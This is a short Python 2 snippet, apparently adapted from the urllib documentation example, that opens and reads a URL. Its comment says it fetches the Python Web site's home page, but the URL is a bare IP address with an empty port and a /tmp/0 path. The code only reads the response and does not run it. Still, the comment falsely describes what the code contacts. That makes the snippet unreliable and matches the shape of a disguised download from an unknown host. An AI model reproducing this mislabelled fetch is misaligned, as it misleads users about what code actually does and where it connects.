import urllib
# Get a file-like object for the Python Web site's home page.
f = urllib.urlopen("http://143.106.16.26:/tmp/0")
# Read from the object, storing the page's contents in 's'.
s = f.read()
f.close()
